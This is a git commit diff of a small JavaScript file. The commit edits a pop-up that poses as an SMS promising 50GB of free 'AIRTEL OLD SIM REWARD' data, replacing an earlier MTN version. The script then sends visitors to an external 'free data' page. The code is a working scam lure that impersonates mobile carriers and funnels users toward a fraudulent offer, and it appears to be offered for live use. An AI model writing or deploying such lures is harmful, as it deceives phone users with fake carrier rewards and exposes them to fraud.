63d14cad6eb6c638264c112b5cb7c5e80b5a24d8
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-08-26 01:17:33 -0700

    Update google-active.js

--- google-active.js
+++ google-active.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '50GB Free Data'
-password=prompt('SMS: Congratulations Your Number is Eligible to receive 20GB Free Data MTN OLD SIM REWARD, Kindly Press OK to ACTIVATE ','50GB Free Data');
-if (password != '20GB Free Data') {
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 50GB Free Data AIRTEL OLD SIM REWARD, Veuillez appuyer sur OK pour activer ','50GB Free Data');
+if (password != '50GB Free Data') {
 location.href='https://all-free-byt.org/airtel-4g.html';
 }
